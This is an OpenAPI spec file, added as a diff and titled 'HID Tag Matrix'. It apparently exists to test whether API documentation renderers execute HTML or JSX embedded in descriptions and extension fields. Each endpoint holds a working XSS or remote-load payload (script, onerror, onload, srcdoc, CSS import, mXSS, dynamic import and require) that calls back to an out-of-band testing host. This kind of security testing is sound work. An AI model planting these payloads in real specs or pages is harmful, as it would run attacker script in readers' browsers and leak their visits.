@@ -1,0 +1,579 @@
+openapi: 3.0.4
+info:
+  title: HID Tag Matrix
+  version: 1.0.0
+servers:
+  - url: https://api.example.com
+paths:
+  /hid-c1-s:
+    get:
+      summary: "HID C1 S EXPR-BRACE-1+1"
+      operationId: hidc1s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-C1-S-START {1 + 1} HID-C1-S-END
+  /hid-c1-x:
+    get:
+      summary: "HID C1 X EXPR-BRACE-1+1"
+      operationId: hidc1x
+      x-mint:
+        content: |
+          HID-C1-X-START {1 + 1} HID-C1-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-c2-s:
+    get:
+      summary: "HID C2 S DOUBLE-BRACE-PARSEFAIL"
+      operationId: hidc2s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-C2-S-START {{hid.ctrl}} HID-C2-S-END
+  /hid-c2-x:
+    get:
+      summary: "HID C2 X DOUBLE-BRACE-PARSEFAIL"
+      operationId: hidc2x
+      x-mint:
+        content: |
+          HID-C2-X-START {{hid.ctrl}} HID-C2-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t01-s:
+    get:
+      summary: "HID T01 S SCRIPT-INLINE-AND-SRC"
+      operationId: hidt01s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T01-S-START <script>window.__HID01=1;fetch('https://hid-t01s-i.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')</script><script src="https://hid-t01s-s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t01.js"></script> HID-T01-S-END
+  /hid-t01-x:
+    get:
+      summary: "HID T01 X SCRIPT-INLINE-AND-SRC"
+      operationId: hidt01x
+      x-mint:
+        content: |
+          HID-T01-X-START <script>window.__HID01=1;fetch('https://hid-t01x-i.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')</script><script src="https://hid-t01x-s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t01.js"></script> HID-T01-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t02-s:
+    get:
+      summary: "HID T02 S SVG-ONLOAD"
+      operationId: hidt02s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T02-S-START <svg width="10" height="10" xmlns="http://www.w3.org/2000/svg" onload="window.__HID02=1;fetch('https://hid-t02s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')"><circle r="5"></circle></svg> HID-T02-S-END
+  /hid-t02-x:
+    get:
+      summary: "HID T02 X SVG-ONLOAD"
+      operationId: hidt02x
+      x-mint:
+        content: |
+          HID-T02-X-START <svg width="10" height="10" xmlns="http://www.w3.org/2000/svg" onload="window.__HID02=1;fetch('https://hid-t02x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')"><circle r="5"></circle></svg> HID-T02-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t03-s:
+    get:
+      summary: "HID T03 S IMG-ONERROR"
+      operationId: hidt03s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T03-S-START <img src="https://hid-t03s-bad.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t03.png" alt="hid03" onerror="window.__HID03=1;fetch('https://hid-t03s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')" /> HID-T03-S-END
+  /hid-t03-x:
+    get:
+      summary: "HID T03 X IMG-ONERROR"
+      operationId: hidt03x
+      x-mint:
+        content: |
+          HID-T03-X-START <img src="https://hid-t03x-bad.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t03.png" alt="hid03" onerror="window.__HID03=1;fetch('https://hid-t03x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')" /> HID-T03-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t04-s:
+    get:
+      summary: "HID T04 S IFRAME-SRC-JAVASCRIPT"
+      operationId: hidt04s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T04-S-START <iframe width="10" height="10" src="javascript:top.__HID04=1;fetch('https://hid-t04s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')"></iframe> HID-T04-S-END
+  /hid-t04-x:
+    get:
+      summary: "HID T04 X IFRAME-SRC-JAVASCRIPT"
+      operationId: hidt04x
+      x-mint:
+        content: |
+          HID-T04-X-START <iframe width="10" height="10" src="javascript:top.__HID04=1;fetch('https://hid-t04x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')"></iframe> HID-T04-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t05-s:
+    get:
+      summary: "HID T05 S STYLE-AT-IMPORT"
+      operationId: hidt05s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T05-S-START <style>@import url('https://hid-t05s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t05.css');</style> HID-T05-S-END
+  /hid-t05-x:
+    get:
+      summary: "HID T05 X STYLE-AT-IMPORT"
+      operationId: hidt05x
+      x-mint:
+        content: |
+          HID-T05-X-START <style>@import url('https://hid-t05x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t05.css');</style> HID-T05-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t06-s:
+    get:
+      summary: "HID T06 S STYLE-URL-BRACES"
+      operationId: hidt06s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T06-S-START <style>body{background-image:url('https://hid-t06s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t06bg.png');}</style> HID-T06-S-END
+  /hid-t06-x:
+    get:
+      summary: "HID T06 X STYLE-URL-BRACES"
+      operationId: hidt06x
+      x-mint:
+        content: |
+          HID-T06-X-START <style>body{background-image:url('https://hid-t06x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t06bg.png');}</style> HID-T06-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t07-s:
+    get:
+      summary: "HID T07 S STYLE-EXPRESSION-INLINE"
+      operationId: hidt07s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T07-S-START <div style="width: expression(window.__HID07=1); background-image: url('https://hid-t07s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t07.png')">HID07DIV</div> HID-T07-S-END
+  /hid-t07-x:
+    get:
+      summary: "HID T07 X STYLE-EXPRESSION-INLINE"
+      operationId: hidt07x
+      x-mint:
+        content: |
+          HID-T07-X-START <div style="width: expression(window.__HID07=1); background-image: url('https://hid-t07x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t07.png')">HID07DIV</div> HID-T07-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t08-s:
+    get:
+      summary: "HID T08 S META-REFRESH"
+      operationId: hidt08s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T08-S-START <meta http-equiv="refresh" content="3;url=https://hid-t08s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t08" /> HID-T08-S-END
+  /hid-t08-x:
+    get:
+      summary: "HID T08 X META-REFRESH"
+      operationId: hidt08x
+      x-mint:
+        content: |
+          HID-T08-X-START <meta http-equiv="refresh" content="3;url=https://hid-t08x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t08" /> HID-T08-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t09-s:
+    get:
+      summary: "HID T09 S LINK-REL-IMPORT"
+      operationId: hidt09s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T09-S-START <link rel="import" href="https://hid-t09s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t09.html" /> HID-T09-S-END
+  /hid-t09-x:
+    get:
+      summary: "HID T09 X LINK-REL-IMPORT"
+      operationId: hidt09x
+      x-mint:
+        content: |
+          HID-T09-X-START <link rel="import" href="https://hid-t09x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t09.html" /> HID-T09-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t10-s:
+    get:
+      summary: "HID T10 S FORM-ACTION"
+      operationId: hidt10s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T10-S-START <form action="https://hid-t10s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t10" method="get"><input type="text" name="q" value="HID10" /><button type="submit">HID10SUB</button></form> HID-T10-S-END
+  /hid-t10-x:
+    get:
+      summary: "HID T10 X FORM-ACTION"
+      operationId: hidt10x
+      x-mint:
+        content: |
+          HID-T10-X-START <form action="https://hid-t10x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t10" method="get"><input type="text" name="q" value="HID10" /><button type="submit">HID10SUB</button></form> HID-T10-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t11-s:
+    get:
+      summary: "HID T11 S BASE-HREF"
+      operationId: hidt11s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T11-S-START <base href="https://hid-t11s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/" /><a href="t11rel">HID11REL</a> HID-T11-S-END
+  /hid-t11-x:
+    get:
+      summary: "HID T11 X BASE-HREF"
+      operationId: hidt11x
+      x-mint:
+        content: |
+          HID-T11-X-START <base href="https://hid-t11x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/" /><a href="t11rel">HID11REL</a> HID-T11-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t12-s:
+    get:
+      summary: "HID T12 S OBJECT-EMBED"
+      operationId: hidt12s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T12-S-START <object data="https://hid-t12s-o.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t12o"></object><embed src="https://hid-t12s-e.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t12e" /> HID-T12-S-END
+  /hid-t12-x:
+    get:
+      summary: "HID T12 X OBJECT-EMBED"
+      operationId: hidt12x
+      x-mint:
+        content: |
+          HID-T12-X-START <object data="https://hid-t12x-o.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t12o"></object><embed src="https://hid-t12x-e.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t12e" /> HID-T12-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t13-s:
+    get:
+      summary: "HID T13 S MATH-MGLYPH-MXSS"
+      operationId: hidt13s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T13-S-START <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=fetch('https://hid-t13s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired)&gt;"></mtext></math> <math><mglyph src="https://hid-t13s-g.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t13g"></mglyph></math> HID-T13-S-END
+  /hid-t13-x:
+    get:
+      summary: "HID T13 X MATH-MGLYPH-MXSS"
+      operationId: hidt13x
+      x-mint:
+        content: |
+          HID-T13-X-START <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=fetch('https://hid-t13x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired)&gt;"></mtext></math> <math><mglyph src="https://hid-t13x-g.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t13g"></mglyph></math> HID-T13-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t14-s:
+    get:
+      summary: "HID T14 S MD-IMAGE-TITLE-ATTR-INJECTION"
+      operationId: hidt14s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T14-S-START ![HID14](https://hid-t14s-img.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t14.png "\" onerror=\"fetch('https://hid-t14s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')") HID-T14-S-END
+  /hid-t14-x:
+    get:
+      summary: "HID T14 X MD-IMAGE-TITLE-ATTR-INJECTION"
+      operationId: hidt14x
+      x-mint:
+        content: |
+          HID-T14-X-START ![HID14](https://hid-t14x-img.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t14.png "\" onerror=\"fetch('https://hid-t14x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')") HID-T14-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t15-s:
+    get:
+      summary: "HID T15 S RAW-ATTR-EVENT-HANDLERS"
+      operationId: hidt15s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T15-S-START <a href="https://hid-t15s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t15" title="HID15" onclick="window.__HID15=1;fetch('https://hid-t15s-c.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')" onmouseover="fetch('https://hid-t15s-m.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')">HID15LINK</a> HID-T15-S-END
+  /hid-t15-x:
+    get:
+      summary: "HID T15 X RAW-ATTR-EVENT-HANDLERS"
+      operationId: hidt15x
+      x-mint:
+        content: |
+          HID-T15-X-START <a href="https://hid-t15x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t15" title="HID15" onclick="window.__HID15=1;fetch('https://hid-t15x-c.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')" onmouseover="fetch('https://hid-t15x-m.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')">HID15LINK</a> HID-T15-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t16-s:
+    get:
+      summary: "HID T16 S ATTR-CONTEXT-BREAKOUT"
+      operationId: hidt16s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T16-S-START "><img src="https://hid-t16s-img.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t16.png" alt="hid16" onerror="fetch('https://hid-t16s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')" /><div title="x" onmouseover="fetch('https://hid-t16s-m.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')">HID16DIV</div> HID-T16-S-END
+  /hid-t16-x:
+    get:
+      summary: "HID T16 X ATTR-CONTEXT-BREAKOUT"
+      operationId: hidt16x
+      x-mint:
+        content: |
+          HID-T16-X-START "><img src="https://hid-t16x-img.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/t16.png" alt="hid16" onerror="fetch('https://hid-t16x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')" /><div title="x" onmouseover="fetch('https://hid-t16x-m.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')">HID16DIV</div> HID-T16-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-t17-s:
+    get:
+      summary: "HID T17 S IFRAME-SRCDOC-SCRIPT"
+      operationId: hidt17s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-T17-S-START <iframe width="10" height="10" srcdoc="<script>top.__HID17=1;fetch('https://hid-t17s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')</script>"></iframe> HID-T17-S-END
+  /hid-t17-x:
+    get:
+      summary: "HID T17 X IFRAME-SRCDOC-SCRIPT"
+      operationId: hidt17x
+      x-mint:
+        content: |
+          HID-T17-X-START <iframe width="10" height="10" srcdoc="<script>top.__HID17=1;fetch('https://hid-t17x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/fired')</script>"></iframe> HID-T17-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-b01-s:
+    get:
+      summary: "HID B01 S ASYNC-IMPORT"
+      operationId: hidb01s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-B01-S-START {import('/snippets/Canary.tsx').then((m) => 'HIDB01-LOCAL-LOADED', (e) => 'HIDB01-LOCAL-ERR:' + String(e))} {import('https://hid-b01s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b1.mjs').then(() => 'HIDB01-URL-LOADED', (e) => 'HIDB01-URL-ERR:' + String(e))} HID-B01-S-END
+  /hid-b01-x:
+    get:
+      summary: "HID B01 X ASYNC-IMPORT"
+      operationId: hidb01x
+      x-mint:
+        content: |
+          HID-B01-X-START {import('/snippets/Canary.tsx').then((m) => 'HIDB01-LOCAL-LOADED', (e) => 'HIDB01-LOCAL-ERR:' + String(e))} {import('https://hid-b01x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b1.mjs').then(() => 'HIDB01-URL-LOADED', (e) => 'HIDB01-URL-ERR:' + String(e))} HID-B01-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-b02-s:
+    get:
+      summary: "HID B02 S REQUIRE"
+      operationId: hidb02s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-B02-S-START {(() => { try { return 'HIDB02-LOCAL:' + String(require('/snippets/Canary.tsx')) } catch (e) { return 'HIDB02-LOCAL-ERR:' + String(e) } })()} {(() => { try { return 'HIDB02-URL:' + String(require('https://hid-b02s.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b2.js')) } catch (e) { return 'HIDB02-URL-ERR:' + String(e) } })()} HID-B02-S-END
+  /hid-b02-x:
+    get:
+      summary: "HID B02 X REQUIRE"
+      operationId: hidb02x
+      x-mint:
+        content: |
+          HID-B02-X-START {(() => { try { return 'HIDB02-LOCAL:' + String(require('/snippets/Canary.tsx')) } catch (e) { return 'HIDB02-LOCAL-ERR:' + String(e) } })()} {(() => { try { return 'HIDB02-URL:' + String(require('https://hid-b02x.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b2.js')) } catch (e) { return 'HIDB02-URL-ERR:' + String(e) } })()} HID-B02-X-END
+      responses:
+        '200':
+          description: ok
+  /hid-b03-s:
+    get:
+      summary: "HID B03 S LINK-PREFETCH-PRELOAD"
+      operationId: hidb03s
+      responses:
+        '200':
+          description: ok
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  p1:
+                    type: string
+                    description: |
+                      HID-B03-S-START <link rel="prefetch" href="https://hid-b03s-p.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b3p" /><link rel="preload" href="https://hid-b03s-l.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b3l" as="script" /> HID-B03-S-END
+  /hid-b03-x:
+    get:
+      summary: "HID B03 X LINK-PREFETCH-PRELOAD"
+      operationId: hidb03x
+      x-mint:
+        content: |
+          HID-B03-X-START <link rel="prefetch" href="https://hid-b03x-p.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b3p" /><link rel="preload" href="https://hid-b03x-l.dbbo77a80pk1sdvpfmh07iji8eau4tzpj.oast.site/b3l" as="script" /> HID-B03-X-END
+      responses:
+        '200':
+          description: ok
